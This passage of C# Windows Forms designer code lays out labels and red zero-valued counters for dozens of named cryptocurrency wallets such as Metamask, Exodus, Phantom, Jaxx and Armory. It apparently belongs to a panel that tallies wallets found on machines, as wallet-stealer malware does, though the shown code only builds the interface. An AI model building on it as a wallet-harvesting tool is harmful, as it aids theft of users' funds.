            this.txtMathE.Size = new System.Drawing.Size(15, 16);
            this.txtMathE.TabIndex = 311;
            this.txtMathE.Text = "0";
            this.txtAuvitas.AutoSize = true;
            this.txtAuvitas.BackColor = System.Drawing.Color.White;
            this.txtAuvitas.Font = new System.Drawing.Font("Microsoft Sans Serif", 9.75f, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, 0);
            this.txtAuvitas.ForeColor = System.Drawing.Color.Red;
            this.txtAuvitas.Location = new System.Drawing.Point(163, 557);
            this.txtAuvitas.Name = "txtAuvitas";
            this.txtAuvitas.Size = new System.Drawing.Size(15, 16);
            this.txtAuvitas.TabIndex = 310;
            this.txtAuvitas.Text = "0";
            this.label52.AutoSize = true;
            this.label52.Font = new System.Drawing.Font("Verdana", 6.75f, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, 0);
            this.label52.Location = new System.Drawing.Point(451, 557);
            this.label52.Name = "label52";
            this.label52.Size = new System.Drawing.Size(30, 12);
            this.label52.TabIndex = 304;
            this.label52.Text = "Math";
            this.txtMTV.AutoSize = true;
            this.txtMTV.Font = new System.Drawing.Font("Verdana", 6.75f, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, 0);
            this.txtMTV.Location = new System.Drawing.Point(623, 557);
            this.txtMTV.Name = "txtMTV";
            this.txtMTV.Size = new System.Drawing.Size(24, 12);
            this.txtMTV.TabIndex = 303;
            this.txtMTV.Text = "Mtv";
            this.label54.AutoSize = true;
            this.label54.Font = new System.Drawing.Font("Verdana", 6.75f, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, 0);
            this.label54.Location = new System.Drawing.Point(798, 557);
            this.label54.Name = "label54";
            this.label54.Size = new System.Drawing.Size(35, 12);
            this.label54.TabIndex = 302;
            this.label54.Text = "Rabet";
            this.label55.AutoSize = true;
            this.label55.Font = new System.Drawing.Font("Verdana", 6.75f, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, 0);
            this.label55.Location = new System.Drawing.Point(263, 557);
            this.label55.Name = "label55";
            this.label55.Size = new System.Drawing.Size(56, 12);
            this.label55.TabIndex = 301;
            this.label55.Text = "Metamask";
            this.label56.AutoSize = true;
            this.label56.Font = new System.Drawing.Font("Verdana", 6.75f, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, 0);
            this.label56.Location = new System.Drawing.Point(111, 557);
            this.label56.Name = "label56";
            this.label56.Size = new System.Drawing.Size(44, 12);
            this.label56.TabIndex = 300;
            this.label56.Text = "Auvitas";
            this.txtETH.AutoSize = true;
            this.txtETH.BackColor = System.Drawing.Color.White;
            this.txtETH.Font = new System.Drawing.Font("Microsoft Sans Serif", 9.75f, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, 0);
            this.txtETH.ForeColor = System.Drawing.Color.Red;
            this.txtETH.Location = new System.Drawing.Point(338, 120);
            this.txtETH.Name = "txtETH";
            this.txtETH.Size = new System.Drawing.Size(15, 16);
            this.txtETH.TabIndex = 293;
            this.txtETH.Text = "0";
            this.txtBitcoin.AutoSize = true;
            this.txtBitcoin.BackColor = System.Drawing.Color.White;
            this.txtBitcoin.Font = new System.Drawing.Font("Microsoft Sans Serif", 9.75f, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, 0);
            this.txtBitcoin.ForeColor = System.Drawing.Color.Red;
            this.txtBitcoin.Location = new System.Drawing.Point(1017, 120);
            this.txtBitcoin.Name = "txtBitcoin";
            this.txtBitcoin.Size = new System.Drawing.Size(15, 16);
            this.txtBitcoin.TabIndex = 292;
            this.txtBitcoin.Text = "0";
            this.txtDash.AutoSize = true;
            this.txtDash.BackColor = System.Drawing.Color.White;
            this.txtDash.Font = new System.Drawing.Font("Microsoft Sans Serif", 9.75f, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, 0);
            this.txtDash.ForeColor = System.Drawing.Color.Red;
            this.txtDash.Location = new System.Drawing.Point(160, 176);
            this.txtDash.Name = "txtDash";
            this.txtDash.Size = new System.Drawing.Size(15, 16);
            this.txtDash.TabIndex = 291;
            this.txtDash.Text = "0";
            this.txtLitecoin.AutoSize = true;
            this.txtLitecoin.BackColor = System.Drawing.Color.White;
            this.txtLitecoin.Font = new System.Drawing.Font("Microsoft Sans Serif", 9.75f, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, 0);
            this.txtLitecoin.ForeColor = System.Drawing.Color.Red;
            this.txtLitecoin.Location = new System.Drawing.Point(863, 120);
            this.txtLitecoin.Name = "txtLitecoin";
            this.txtLitecoin.Size = new System.Drawing.Size(15, 16);
            this.txtLitecoin.TabIndex = 290;
            this.txtLitecoin.Text = "0";
            this.txtAtom.AutoSize = true;
            this.txtAtom.BackColor = System.Drawing.Color.White;
            this.txtAtom.Font = new System.Drawing.Font("Microsoft Sans Serif", 9.75f, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, 0);
            this.txtAtom.ForeColor = System.Drawing.Color.Red;
            this.txtAtom.Location = new System.Drawing.Point(516, 120);
            this.txtAtom.Name = "txtAtom";
            this.txtAtom.Size = new System.Drawing.Size(15, 16);
            this.txtAtom.TabIndex = 289;
            this.txtAtom.Text = "0";
            this.txtElec.AutoSize = true;
            this.txtElec.BackColor = System.Drawing.Color.White;
            this.txtElec.Font = new System.Drawing.Font("Microsoft Sans Serif", 9.75f, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, 0);
            this.txtElec.ForeColor = System.Drawing.Color.Red;
            this.txtElec.Location = new System.Drawing.Point(160, 120);
            this.txtElec.Name = "txtElec";
            this.txtElec.Size = new System.Drawing.Size(15, 16);
            this.txtElec.TabIndex = 288;
            this.txtElec.Text = "0";
            this.label44.AutoSize = true;
            this.label44.Font = new System.Drawing.Font("Verdana", 6.75f, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, 0);
            this.label44.Location = new System.Drawing.Point(449, 120);
            this.label44.Name = "label44";
            this.label44.Size = new System.Drawing.Size(41, 12);
            this.label44.TabIndex = 281;
            this.label44.Text = "Atomic";
            this.label45.AutoSize = true;
            this.label45.Font = new System.Drawing.Font("Verdana", 6.75f, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, 0);
            this.label45.Location = new System.Drawing.Point(795, 120);
            this.label45.Name = "label45";
            this.label45.Size = new System.Drawing.Size(45, 12);
            this.label45.TabIndex = 280;
            this.label45.Text = "Litecoin";
            this.label47.AutoSize = true;
            this.label47.Font = new System.Drawing.Font("Verdana", 6.75f, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, 0);
            this.label47.Location = new System.Drawing.Point(260, 120);
            this.label47.Name = "label47";
            this.label47.Size = new System.Drawing.Size(53, 12);
            this.label47.TabIndex = 278;
            this.label47.Text = "Ethereum";
            this.label49.AutoSize = true;
            this.label49.Font = new System.Drawing.Font("Verdana", 6.75f, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, 0);
            this.label49.Location = new System.Drawing.Point(956, 120);
            this.label49.Name = "label49";
            this.label49.Size = new System.Drawing.Size(40, 12);
            this.label49.TabIndex = 276;
            this.label49.Text = "Bitcoin";
            this.txtBitapp.AutoSize = true;
            this.txtBitapp.BackColor = System.Drawing.Color.White;
            this.txtBitapp.Font = new System.Drawing.Font("Microsoft Sans Serif", 9.75f, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, 0);
            this.txtBitapp.ForeColor = System.Drawing.Color.Red;
            this.txtBitapp.Location = new System.Drawing.Point(340, 271);
            this.txtBitapp.Name = "txtBitapp";
            this.txtBitapp.Size = new System.Drawing.Size(15, 16);
            this.txtBitapp.TabIndex = 275;
            this.txtBitapp.Text = "0";
            this.txtCoin98.AutoSize = true;
            this.txtCoin98.BackColor = System.Drawing.Color.White;
            this.txtCoin98.Font = new System.Drawing.Font("Microsoft Sans Serif", 9.75f, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, 0);
            this.txtCoin98.ForeColor = System.Drawing.Color.Red;
            this.txtCoin98.Location = new System.Drawing.Point(340, 334);
            this.txtCoin98.Name = "txtCoin98";
            this.txtCoin98.Size = new System.Drawing.Size(15, 16);
            this.txtCoin98.TabIndex = 274;
            this.txtCoin98.Text = "0";
            this.txtEqual.AutoSize = true;
            this.txtEqual.BackColor = System.Drawing.Color.White;
            this.txtEqual.Font = new System.Drawing.Font("Microsoft Sans Serif", 9.75f, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, 0);
            this.txtEqual.ForeColor = System.Drawing.Color.Red;
            this.txtEqual.Location = new System.Drawing.Point(340, 398);
            this.txtEqual.Name = "txtEqual";
            this.txtEqual.Size = new System.Drawing.Size(15, 16);
            this.txtEqual.TabIndex = 273;
            this.txtEqual.Text = "0";
            this.txtMetamask.AutoSize = true;
            this.txtMetamask.BackColor = System.Drawing.Color.White;
            this.txtMetamask.Font = new System.Drawing.Font("Microsoft Sans Serif", 9.75f, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, 0);
            this.txtMetamask.ForeColor = System.Drawing.Color.Red;
            this.txtMetamask.Location = new System.Drawing.Point(340, 460);
            this.txtMetamask.Name = "txtMetamask";
            this.txtMetamask.Size = new System.Drawing.Size(15, 16);
            this.txtMetamask.TabIndex = 272;
            this.txtMetamask.Text = "0";
            this.txtJaxx.AutoSize = true;
            this.txtJaxx.BackColor = System.Drawing.Color.White;
            this.txtJaxx.Font = new System.Drawing.Font("Microsoft Sans Serif", 9.75f, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, 0);
            this.txtJaxx.ForeColor = System.Drawing.Color.Red;
            this.txtJaxx.Location = new System.Drawing.Point(338, 61);
            this.txtJaxx.Name = "txtJaxx";
            this.txtJaxx.Size = new System.Drawing.Size(15, 16);
            this.txtJaxx.TabIndex = 271;
            this.txtJaxx.Text = "0";
            this.txtKeplr.AutoSize = true;
            this.txtKeplr.BackColor = System.Drawing.Color.White;
            this.txtKeplr.Font = new System.Drawing.Font("Microsoft Sans Serif", 9.75f, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, 0);
            this.txtKeplr.ForeColor = System.Drawing.Color.Red;
            this.txtKeplr.Location = new System.Drawing.Point(1019, 271);
            this.txtKeplr.Name = "txtKeplr";
            this.txtKeplr.Size = new System.Drawing.Size(15, 16);
            this.txtKeplr.TabIndex = 270;
            this.txtKeplr.Text = "0";
            this.txtCrocobit.AutoSize = true;
            this.txtCrocobit.BackColor = System.Drawing.Color.White;
            this.txtCrocobit.Font = new System.Drawing.Font("Microsoft Sans Serif", 9.75f, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, 0);
            this.txtCrocobit.ForeColor = System.Drawing.Color.Red;
            this.txtCrocobit.Location = new System.Drawing.Point(1019, 334);
            this.txtCrocobit.Name = "txtCrocobit";
            this.txtCrocobit.Size = new System.Drawing.Size(15, 16);
            this.txtCrocobit.TabIndex = 269;
            this.txtCrocobit.Text = "0";
            this.txtOxygen.AutoSize = true;
            this.txtOxygen.BackColor = System.Drawing.Color.White;
            this.txtOxygen.Font = new System.Drawing.Font("Microsoft Sans Serif", 9.75f, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, 0);
            this.txtOxygen.ForeColor = System.Drawing.Color.Red;
            this.txtOxygen.Location = new System.Drawing.Point(1019, 398);
            this.txtOxygen.Name = "txtOxygen";
            this.txtOxygen.Size = new System.Drawing.Size(15, 16);
            this.txtOxygen.TabIndex = 268;
            this.txtOxygen.Text = "0";
            this.txtGuarda.AutoSize = true;
            this.txtGuarda.BackColor = System.Drawing.Color.White;
            this.txtGuarda.Font = new System.Drawing.Font("Microsoft Sans Serif", 9.75f, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, 0);
            this.txtGuarda.ForeColor = System.Drawing.Color.Red;
            this.txtGuarda.Location = new System.Drawing.Point(690, 120);
            this.txtGuarda.Name = "txtGuarda";
            this.txtGuarda.Size = new System.Drawing.Size(15, 16);
            this.txtGuarda.TabIndex = 267;
            this.txtGuarda.Text = "0";
            this.txtBytecoin.AutoSize = true;
            this.txtBytecoin.BackColor = System.Drawing.Color.White;
            this.txtBytecoin.Font = new System.Drawing.Font("Microsoft Sans Serif", 9.75f, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, 0);
            this.txtBytecoin.ForeColor = System.Drawing.Color.Red;
            this.txtBytecoin.Location = new System.Drawing.Point(1017, 61);
            this.txtBytecoin.Name = "txtBytecoin";
            this.txtBytecoin.Size = new System.Drawing.Size(15, 16);
            this.txtBytecoin.TabIndex = 266;
            this.txtBytecoin.Text = "0";
            this.txtMobox.AutoSize = true;
            this.txtMobox.BackColor = System.Drawing.Color.White;
            this.txtMobox.Font = new System.Drawing.Font("Microsoft Sans Serif", 9.75f, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, 0);
            this.txtMobox.ForeColor = System.Drawing.Color.Red;
            this.txtMobox.Location = new System.Drawing.Point(864, 271);
            this.txtMobox.Name = "txtMobox";
            this.txtMobox.Size = new System.Drawing.Size(15, 16);
            this.txtMobox.TabIndex = 265;
            this.txtMobox.Text = "0";
            this.txtGuild.AutoSize = true;
            this.txtGuild.BackColor = System.Drawing.Color.White;
            this.txtGuild.Font = new System.Drawing.Font("Microsoft Sans Serif", 9.75f, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, 0);
            this.txtGuild.ForeColor = System.Drawing.Color.Red;
            this.txtGuild.Location = new System.Drawing.Point(864, 334);
            this.txtGuild.Name = "txtGuild";
            this.txtGuild.Size = new System.Drawing.Size(15, 16);
            this.txtGuild.TabIndex = 264;
            this.txtGuild.Text = "0";
            this.txtIconex.AutoSize = true;
            this.txtIconex.BackColor = System.Drawing.Color.White;
            this.txtIconex.Font = new System.Drawing.Font("Microsoft Sans Serif", 9.75f, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, 0);
            this.txtIconex.ForeColor = System.Drawing.Color.Red;
            this.txtIconex.Location = new System.Drawing.Point(864, 398);
            this.txtIconex.Name = "txtIconex";
            this.txtIconex.Size = new System.Drawing.Size(15, 16);
            this.txtIconex.TabIndex = 263;
            this.txtIconex.Text = "0";
            this.txtTon.AutoSize = true;
            this.txtTon.BackColor = System.Drawing.Color.White;
            this.txtTon.Font = new System.Drawing.Font("Microsoft Sans Serif", 9.75f, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, 0);
            this.txtTon.ForeColor = System.Drawing.Color.Red;
            this.txtTon.Location = new System.Drawing.Point(864, 460);
            this.txtTon.Name = "txtTon";
            this.txtTon.Size = new System.Drawing.Size(15, 16);
            this.txtTon.TabIndex = 262;
            this.txtTon.Text = "0";
            this.txtCoinomi.AutoSize = true;
            this.txtCoinomi.BackColor = System.Drawing.Color.White;
            this.txtCoinomi.Font = new System.Drawing.Font("Microsoft Sans Serif", 9.75f, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, 0);
            this.txtCoinomi.ForeColor = System.Drawing.Color.Red;
            this.txtCoinomi.Location = new System.Drawing.Point(862, 61);
            this.txtCoinomi.Name = "txtCoinomi";
            this.txtCoinomi.Size = new System.Drawing.Size(15, 16);
            this.txtCoinomi.TabIndex = 261;
            this.txtCoinomi.Text = "0";
            this.txtSollet.AutoSize = true;
            this.txtSollet.BackColor = System.Drawing.Color.White;
            this.txtSollet.Font = new System.Drawing.Font("Microsoft Sans Serif", 9.75f, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, 0);
            this.txtSollet.ForeColor = System.Drawing.Color.Red;
            this.txtSollet.Location = new System.Drawing.Point(692, 271);
            this.txtSollet.Name = "txtSollet";
            this.txtSollet.Size = new System.Drawing.Size(15, 16);
            this.txtSollet.TabIndex = 260;
            this.txtSollet.Text = "0";
            this.txtSlope.AutoSize = true;
            this.txtSlope.BackColor = System.Drawing.Color.White;
            this.txtSlope.Font = new System.Drawing.Font("Microsoft Sans Serif", 9.75f, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, 0);
            this.txtSlope.ForeColor = System.Drawing.Color.Red;
            this.txtSlope.Location = new System.Drawing.Point(692, 334);
            this.txtSlope.Name = "txtSlope";
            this.txtSlope.Size = new System.Drawing.Size(15, 16);
            this.txtSlope.TabIndex = 259;
            this.txtSlope.Text = "0";
            this.txtStarcoin.AutoSize = true;
            this.txtStarcoin.BackColor = System.Drawing.Color.White;
            this.txtStarcoin.Font = new System.Drawing.Font("Microsoft Sans Serif", 9.75f, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, 0);
            this.txtStarcoin.ForeColor = System.Drawing.Color.Red;
            this.txtStarcoin.Location = new System.Drawing.Point(692, 398);
            this.txtStarcoin.Name = "txtStarcoin";
            this.txtStarcoin.Size = new System.Drawing.Size(15, 16);
            this.txtStarcoin.TabIndex = 258;
            this.txtStarcoin.Text = "0";
            this.txtPhantom.AutoSize = true;
            this.txtPhantom.BackColor = System.Drawing.Color.White;
            this.txtPhantom.Font = new System.Drawing.Font("Microsoft Sans Serif", 9.75f, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, 0);
            this.txtPhantom.ForeColor = System.Drawing.Color.Red;
            this.txtPhantom.Location = new System.Drawing.Point(692, 460);
            this.txtPhantom.Name = "txtPhantom";
            this.txtPhantom.Size = new System.Drawing.Size(15, 16);
            this.txtPhantom.TabIndex = 257;
            this.txtPhantom.Text = "0";
            this.txtArmory.AutoSize = true;
            this.txtArmory.BackColor = System.Drawing.Color.White;
            this.txtArmory.Font = new System.Drawing.Font("Microsoft Sans Serif", 9.75f, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, 0);
            this.txtArmory.ForeColor = System.Drawing.Color.Red;
            this.txtArmory.Location = new System.Drawing.Point(690, 61);
            this.txtArmory.Name = "txtArmory";
            this.txtArmory.Size = new System.Drawing.Size(15, 16);
            this.txtArmory.TabIndex = 256;
            this.txtArmory.Text = "0";
            this.txtFinnie.AutoSize = true;
            this.txtFinnie.BackColor = System.Drawing.Color.White;
            this.txtFinnie.Font = new System.Drawing.Font("Microsoft Sans Serif", 9.75f, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, 0);
            this.txtFinnie.ForeColor = System.Drawing.Color.Red;
            this.txtFinnie.Location = new System.Drawing.Point(518, 271);
            this.txtFinnie.Name = "txtFinnie";
            this.txtFinnie.Size = new System.Drawing.Size(15, 16);
            this.txtFinnie.TabIndex = 255;
            this.txtFinnie.Text = "0";
            this.txtBinance.AutoSize = true;
            this.txtBinance.BackColor = System.Drawing.Color.White;
            this.txtBinance.Font = new System.Drawing.Font("Microsoft Sans Serif", 9.75f, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, 0);
            this.txtBinance.ForeColor = System.Drawing.Color.Red;
            this.txtBinance.Location = new System.Drawing.Point(518, 334);
            this.txtBinance.Name = "txtBinance";
            this.txtBinance.Size = new System.Drawing.Size(15, 16);
            this.txtBinance.TabIndex = 254;
            this.txtBinance.Text = "0";
            this.txtXinPay.AutoSize = true;
            this.txtXinPay.BackColor = System.Drawing.Color.White;
            this.txtXinPay.Font = new System.Drawing.Font("Microsoft Sans Serif", 9.75f, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, 0);
            this.txtXinPay.ForeColor = System.Drawing.Color.Red;
            this.txtXinPay.Location = new System.Drawing.Point(518, 398);
            this.txtXinPay.Name = "txtXinPay";
            this.txtXinPay.Size = new System.Drawing.Size(15, 16);
            this.txtXinPay.TabIndex = 253;
            this.txtXinPay.Text = "0";
            this.txtMath.AutoSize = true;
            this.txtMath.BackColor = System.Drawing.Color.White;
            this.txtMath.Font = new System.Drawing.Font("Microsoft Sans Serif", 9.75f, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, 0);
            this.txtMath.ForeColor = System.Drawing.Color.Red;
            this.txtMath.Location = new System.Drawing.Point(518, 460);
            this.txtMath.Name = "txtMath";
            this.txtMath.Size = new System.Drawing.Size(15, 16);
            this.txtMath.TabIndex = 252;
            this.txtMath.Text = "0";
            this.txtExodus.AutoSize = true;
            this.txtExodus.BackColor = System.Drawing.Color.White;
            this.txtExodus.Font = new System.Drawing.Font("Microsoft Sans Serif", 9.75f, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, 0);
            this.txtExodus.ForeColor = System.Drawing.Color.Red;
            this.txtExodus.Location = new System.Drawing.Point(516, 61);
            this.txtExodus.Name = "txtExodus";
            this.txtExodus.Size = new System.Drawing.Size(15, 16);
            this.txtExodus.TabIndex = 251;
            this.txtExodus.Text = "0";
            this.txtLiquality.AutoSize = true;
            this.txtLiquality.BackColor = System.Drawing.Color.White;
            this.txtLiquality.Font = new System.Drawing.Font("Microsoft Sans Serif", 9.75f, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, 0);
            this.txtLiquality.ForeColor = System.Drawing.Color.Red;
            this.txtLiquality.Location = new System.Drawing.Point(162, 271);
            this.txtLiquality.Name = "txtLiquality";
            this.txtLiquality.Size = new System.Drawing.Size(15, 16);
            this.txtLiquality.TabIndex = 250;
            this.txtLiquality.Text = "0";
            this.txtTron.AutoSize = true;
            this.txtTron.BackColor = System.Drawing.Color.White;
            this.txtTron.Font = new System.Drawing.Font("Microsoft Sans Serif", 9.75f, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, 0);
            this.txtTron.ForeColor = System.Drawing.Color.Red;
            this.txtTron.Location = new System.Drawing.Point(162, 334);
            this.txtTron.Name = "txtTron";
            this.txtTron.Size = new System.Drawing.Size(15, 16);
            this.txtTron.TabIndex = 249;
            this.txtTron.Text = "0";
            this.txtSwash.AutoSize = true;
            this.txtSwash.BackColor = System.Drawing.Color.White;
            this.txtSwash.Font = new System.Drawing.Font("Microsoft Sans Serif", 9.75f, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, 0);
            this.txtSwash.ForeColor = System.Drawing.Color.Red;
            this.txtSwash.Location = new System.Drawing.Point(162, 398);
            this.txtSwash.Name = "txtSwash";
            this.txtSwash.Size = new System.Drawing.Size(15, 16);
            this.txtSwash.TabIndex = 248;
            this.txtSwash.Text = "0";
            this.txtNifty.AutoSize = true;
            this.txtNifty.BackColor = System.Drawing.Color.White;
            this.txtNifty.Font = new System.Drawing.Font("Microsoft Sans Serif", 9.75f, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, 0);
            this.txtNifty.ForeColor = System.Drawing.Color.Red;
            this.txtNifty.Location = new System.Drawing.Point(162, 460);
            this.txtNifty.Name = "txtNifty";
            this.txtNifty.Size = new System.Drawing.Size(15, 16);
            this.txtNifty.TabIndex = 247;
            this.txtNifty.Text = "0";
            this.txtzcash.AutoSize = true;
            this.txtzcash.BackColor = System.Drawing.Color.White;
            this.txtzcash.Font = new System.Drawing.Font("Microsoft Sans Serif", 9.75f, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, 0);
            this.txtzcash.ForeColor = System.Drawing.Color.Red;
            this.txtzcash.Location = new System.Drawing.Point(160, 61);
            this.txtzcash.Name = "txtzcash";
            this.txtzcash.Size = new System.Drawing.Size(15, 16);
            this.txtzcash.TabIndex = 244;
            this.txtzcash.Text = "0";
            this.label35.AutoSize = true;
            this.label35.Font = new System.Drawing.Font("Verdana", 6.75f, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, 0);
            this.label35.ForeColor = System.Drawing.Color.Black;
            this.label35.Location = new System.Drawing.Point(956, 61);
            this.label35.Name = "label35";
            this.label35.Size = new System.Drawing.Size(49, 12);
            this.label35.TabIndex = 209;
            this.label35.Text = "Bytecoin";
            this.label36.AutoSize = true;
            this.label36.Font = new System.Drawing.Font("Verdana", 6.75f, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, 0);
            this.label36.Location = new System.Drawing.Point(620, 61);
            this.label36.Name = "label36";
            this.label36.Size = new System.Drawing.Size(42, 12);
            this.label36.TabIndex = 210;
            this.label36.Text = "Armory";
            this.label30.AutoSize = true;
            this.label30.Font = new System.Drawing.Font("Verdana", 6.75f, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, 0);
            this.label30.Location = new System.Drawing.Point(451, 334);
            this.label30.Name = "label30";
            this.label30.Size = new System.Drawing.Size(44, 12);
            this.label30.TabIndex = 206;
            this.label30.Text = "Binance";
            this.label29.AutoSize = true;
            this.label29.Font = new System.Drawing.Font("Verdana", 6.75f, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, 0);
            this.label29.Location = new System.Drawing.Point(262, 334);
            this.label29.Name = "label29";
            this.label29.Size = new System.Drawing.Size(38, 12);
            this.label29.TabIndex = 153;
            this.label29.Text = "Coin98";
            this.label32.AutoSize = true;
            this.label32.Font = new System.Drawing.Font("Verdana", 6.75f, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, 0);
            this.label32.Location = new System.Drawing.Point(797, 398);
            this.label32.Name = "label32";
            this.label32.Size = new System.Drawing.Size(39, 12);
            this.label32.TabIndex = 147;
            this.label32.Text = "Iconex";
            this.label33.AutoSize = true;
            this.label33.Font = new System.Drawing.Font("Verdana", 6.75f, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, 0);
            this.label33.Location = new System.Drawing.Point(262, 398);
            this.label33.Name = "label33";
            this.label33.Size = new System.Drawing.Size(32, 12);
            this.label33.TabIndex = 149;
            this.label33.Text = "Equal";
            this.label34.AutoSize = true;
            this.label34.Font = new System.Drawing.Font("Verdana", 6.75f, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, 0);
            this.label34.Location = new System.Drawing.Point(262, 271);
            this.label34.Name = "label34";
            this.label34.Size = new System.Drawing.Size(38, 12);
            this.label34.TabIndex = 151;
            this.label34.Text = "Bitapp";
            this.label23.AutoSize = true;
            this.label23.Font = new System.Drawing.Font("Verdana", 6.75f, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, 0);
            this.label23.Location = new System.Drawing.Point(797, 271);
            this.label23.Name = "label23";
            this.label23.Size = new System.Drawing.Size(37, 12);
            this.label23.TabIndex = 141;
            this.label23.Text = "Mobox";
            this.label24.AutoSize = true;
            this.label24.Font = new System.Drawing.Font("Verdana", 6.75f, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, 0);
            this.label24.Location = new System.Drawing.Point(451, 460);
            this.label24.Name = "label24";
            this.label24.Size = new System.Drawing.Size(30, 12);
            this.label24.TabIndex = 143;
            this.label24.Text = "Math";
            this.label26.AutoSize = true;
            this.label26.Font = new System.Drawing.Font("Verdana", 6.75f, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, 0);
            this.label26.Location = new System.Drawing.Point(797, 334);
            this.label26.Name = "label26";
            this.label26.Size = new System.Drawing.Size(30, 12);
            this.label26.TabIndex = 135;
            this.label26.Text = "Guild";
            this.label27.AutoSize = true;
            this.label27.Font = new System.Drawing.Font("Verdana", 6.75f, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, 0);
            this.label27.Location = new System.Drawing.Point(111, 334);
            this.label27.Name = "label27";
            this.label27.Size = new System.Drawing.Size(27, 12);
            this.label27.TabIndex = 137;
            this.label27.Text = "Tron";
            this.label28.AutoSize = true;
            this.label28.Font = new System.Drawing.Font("Verdana", 6.75f, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, 0);
            this.label28.Location = new System.Drawing.Point(622, 460);
            this.label28.Name = "label28";
            this.label28.Size = new System.Drawing.Size(50, 12);
            this.label28.TabIndex = 139;
            this.label28.Text = "Phantom";
            this.label22.AutoSize = true;
            this.label22.Font = new System.Drawing.Font("Verdana", 6.75f, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, 0);
            this.label22.Location = new System.Drawing.Point(622, 334);
            this.label22.Name = "label22";
            this.label22.Size = new System.Drawing.Size(32, 12);
            this.label22.TabIndex = 133;
            this.label22.Text = "Slope";
            this.label19.AutoSize = true;
            this.label19.Font = new System.Drawing.Font("Verdana", 6.75f, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, 0);
            this.label19.Location = new System.Drawing.Point(797, 460);
            this.label19.Name = "label19";
            this.label19.Size = new System.Drawing.Size(23, 12);
            this.label19.TabIndex = 127;
            this.label19.Text = "Ton";
            this.label20.AutoSize = true;
            this.label20.Font = new System.Drawing.Font("Verdana", 6.75f, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, 0);
            this.label20.Location = new System.Drawing.Point(451, 271);
            this.label20.Name = "label20";
            this.label20.Size = new System.Drawing.Size(35, 12);
            this.label20.TabIndex = 129;
            this.label20.Text = "Finnie";
            this.label21.AutoSize = true;
            this.label21.Font = new System.Drawing.Font("Verdana", 6.75f, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, 0);
            this.label21.Location = new System.Drawing.Point(451, 398);
            this.label21.Name = "label21";
            this.label21.Size = new System.Drawing.Size(40, 12);
            this.label21.TabIndex = 131;
            this.label21.Text = "XinPay";
            this.label16.AutoSize = true;
            this.label16.Font = new System.Drawing.Font("Verdana", 6.75f, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, 0);
            this.label16.Location = new System.Drawing.Point(622, 271);
            this.label16.Name = "label16";
            this.label16.Size = new System.Drawing.Size(34, 12);
            this.label16.TabIndex = 121;
